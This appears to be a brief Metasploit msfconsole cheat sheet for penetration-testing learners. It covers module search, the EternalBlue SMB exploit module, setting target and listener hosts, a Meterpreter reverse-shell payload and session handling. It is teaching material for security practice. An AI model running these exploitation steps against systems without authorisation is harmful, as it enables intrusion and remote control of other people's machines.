### 🔧 **MSFconsole Essentials**

MSFconsole is your **main interface** to interact with Metasploit — everything from choosing an exploit to popping a shell goes through here.

---

### ✅ **Core Skills You Must Master**

1. **Searching for modules:**
    
    ```
    search <keyword>
    ```
    
    Example:
    
    ```
    search smb
    search type:exploit name:windows
    ```
    
2. **Selecting a module:**
    
    ```
    use <module_path>
    ```
    
    Example:
    
    ```
    use exploit/windows/smb/ms17_010_eternalblue
    ```
    
3. **Configuring module options:**
    
    ```
    show options        # View required parameters
    set RHOST <target IP>
    set LHOST <your IP>
    set RPORT <target port>
    set LPORT <listener port>
    ```
    
4. **Searching for payloads:**
    
    ```
    show payloads
    set payload <payload_name>
    ```
    
    Example:
    
    ```
    set payload windows/meterpreter/reverse_tcp
    ```
    
5. **Managing sessions:**  
    After exploitation, list and interact with sessions:
    
    ```
    sessions -l               # List sessions
    sessions -i <ID>          # Interact with a session
    ```
    
6. **Additional functionality:**
    
    - **info** — Get detailed info about the module
        
        ```
        info
        ```
        
    - **check** — Check if the target is vulnerable (if supported)
        
        ```
        check
        ```
        
    - **run / exploit** — Execute the exploit
        
        ```
        run
        ```
        
        or
        
        ```
        exploit
        ```
        
7. **Saving configurations:**  
    To save your current session workspace:
    
    ```
    save
    ```

### 🧠 **MSF Module Variables - Know These Cold**

|Variable|Purpose|
|---|---|
|`LHOST`|IP address of your attacking machine (listener)|
|`LPORT`|Port on your machine to catch the reverse shell|
|`RHOST`|IP of **one** target machine|
|`RHOSTS`|Multiple targets or a subnet (e.g., `192.168.1.0/24`)|
|`RPORT`|Port on the **target** system (e.g., port 445 for SMB)|

You can set variables **globally** if using multiple modules:

```
setg LHOST 192.168.1.100
```

Use `unsetg` to remove a global variable:

```
unsetg LHOST
```

### ⚡ Pro Tip

Before running any exploit:

- Use `check` (if available).
    
- Confirm ports are open with `nmap`.
    
- Make sure your payload matches the target's OS and architecture.
